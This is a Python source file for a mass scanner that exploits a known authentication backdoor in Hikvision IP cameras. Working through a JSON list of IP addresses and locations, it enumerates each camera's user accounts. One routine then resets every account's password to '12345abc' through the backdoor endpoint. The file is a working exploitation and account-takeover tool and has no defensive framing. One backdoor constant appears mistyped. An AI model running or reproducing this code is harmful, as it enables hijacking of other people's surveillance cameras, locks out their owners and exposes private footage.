import requests
import json
from xml.etree import ElementTree as ET
import concurrent.futures
import os
from datetime import datetime
from termcolor import colored
from requests.exceptions import ConnectTimeout
import asyncio
import aiohttp

class HikVisionScanner:
    BACKDOOR_AUTH_ARG = "auth=YWRmaW46MTEK"
    NAMESPACE = {'ns': 'http://www.hikvision.com/ver10/XMLSchema'}
    MAX_PORTS_PER_IP = 50

    @staticmethod
    def get_url_base(cb_https, txt_ip, nud_port):
        scheme = "https" if cb_https else "http"
        return f"{scheme}://{txt_ip}:{nud_port}/"

    @staticmethod
    def process_users_response(file, response, ip, port, country, city):
        if response.status_code != 200:
            print(colored("An error occurred", "light_red"))
            return

        doc = ET.fromstring(response.content)
        users = doc.findall('.//ns:User', HikVisionScanner.NAMESPACE)

        user_ids = {}
        user_names = []
        for user in users:
            user_id = user.find('ns:userName', HikVisionScanner.NAMESPACE).text
            user_name = user.find('ns:id', HikVisionScanner.NAMESPACE).text
            user_ids[user_id] = user_name
            user_names.append(user_name)
        
        line = f"IP: {ip} PORT: {port} | USERS: {', '.join(user_ids)} | LOCATION: {country}, {city}\n"
        
        print(colored(line, "green"))

        file.seek(0)
        if line not in file.read():
            file.write(line)
            file.flush()
            os.fsync(file.fileno())

    @staticmethod
    def get_users_response(ip_port_dict):
        for ip, port in ip_port_dict.items():
            url = HikVisionScanner.get_url_base(False, ip, port) + "Security/users?" + HikVisionScanner.BACKDOOR_AUTH_ARG
            try:
                response = requests.get(url)
                
                if response.status_code != 200:
                    print(colored(f"An error occurred for IP: {ip} PORT: {port}", "light_yellow"))
                    continue

                doc = ET.fromstring(response.content)
                users = doc.findall('.//ns:User', HikVisionScanner.NAMESPACE)

                user_ids = {}
                for user in users:
                    user_id = user.find('ns:userName', HikVisionScanner.NAMESPACE).text
                    user_name = user.find('ns:id', HikVisionScanner.NAMESPACE).text
                    user_ids[user_id] = user_name

                for user_id, user_name in user_ids.items():
                    asyncio.run(HikVisionScanner.set_password(user_id=user_name, user_name=user_id, new_password="12345abc", ip=ip, port=port, use_https=False))

            except ConnectTimeout:
                print(colored(f"Connection timed out for IP: {ip} and Port: {port}", "light_yellow"))
                continue

    @staticmethod
    def get_users(file, cb_https, ip, port, country, city):
        try:
            url = HikVisionScanner.get_url_base(cb_https, ip, port) + "Security/users?" + HikVisionScanner.BACKDOOR_AUTH_ARG
            response = requests.get(url)
            HikVisionScanner.process_users_response(file, response, ip, port, country, city)
        except Exception as e:
            print(colored(f"Error while connecting to {ip}:{port}, error: {e}", "light_red"))

    @staticmethod
    def get_users_in_threads(data):
        current_datetime = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        directory = "results"
        if not os.path.exists(directory):
            os.makedirs(directory)
        result_file_path = os.path.join(directory, f"results-{current_datetime}.txt")

        with open(result_file_path, "a+") as file:
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for item in data:
                    ip = item["ip"]
                    country = item["country"]
                    city = item["city"]
                    port_count = 0
                    for port in item["ports"]:
                        if port_count >= HikVisionScanner.MAX_PORTS_PER_IP:
                            print(colored(f"Skipped remaining ports for IP: {ip}, as the maximum of {HikVisionScanner.MAX_PORTS_PER_IP} ports have already been processed.", "yellow"))
                            break
                        print(colored(f"Trying IP: {ip}, port: {port}", "light_grey"))
                        executor.submit(HikVisionScanner.get_users, file, False, ip, port, country, city)
                        port_count += 1

    @staticmethod
    def load_ips_and_ports(filename):
        with open(filename, "r", encoding="utf-8") as file:
            data = json.load(file)
        HikVisionScanner.get_users_in_threads(data)

    @staticmethod
    async def set_password(user_id, user_name, new_password, ip, port, use_https):
        url_base = f"http{'s' if use_https else ''}://{ip}:{port}"
        backdoor_auth_arg = "auth=YWRtaW46MTEK"
        
        user_xml = f"""
        <User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">
            <id>{user_id}</id>
            <userName>{user_name}</userName>
            <password>{new_password}</password>
        </User>
        """

        async with aiohttp.ClientSession() as session:
            async with session.put(f"{url_base}/Security/users/{user_id}?{backdoor_auth_arg}",
                                data=user_xml) as response:
                if response.status == 200:
                    response_text = await response.text()
                    response_xml = ET.fromstring(response_text)
                    status_string = response_xml.find('{http://www.hikvision.com/ver10/XMLSchema}statusString')
                    if status_string is None:
                        print(colored("statusString element not found in the response", "light_red"))
                    elif status_string.text == "OK":
                        print(colored(f"Successfully assigned password \"{new_password}\" to user \"{user_name}\" | {ip}:{port}", "green"))
                    else:
                        print(colored(f"An error occurred: {response_text}", "red"))
                else:
                    print(colored(f"An error occurred: {response.status}", "light_yellow"))
